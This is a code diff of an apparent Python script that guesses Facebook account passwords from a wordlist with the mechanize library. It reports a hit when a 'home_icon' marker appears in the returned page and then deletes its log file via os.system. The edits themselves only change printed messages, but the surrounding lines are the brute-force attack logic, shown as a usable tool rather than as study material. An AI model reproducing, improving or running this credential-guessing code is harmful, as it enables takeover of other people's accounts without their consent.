@@ -16,7 +16,7 @@ time.sleep(0.5)
 try:
     import mechanize
 except ModuleNotFoundError:
-    print ('[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2')
+    print ('[!] Module >Mechanize< Not Found!\n    Please install mechanize [pip install mechanize] before running the program.')
     exit()
 
 time.sleep(0.5)
@@ -53,7 +53,7 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read()
             if text.find('home_icon', 0, len(text)) != -1:
-                print ('[+] Password Found > '+password )
+                print ('[+] Password Found > '+password+'\n')
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
@@ -66,7 +66,7 @@ for password in wordlist:
             exit()
 
 time.sleep(1)
-print ('Sorry, none of the passswords in your wordlist is right.')
+print ('Sorry, none of the passswords in your wordlist is right.\n')
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
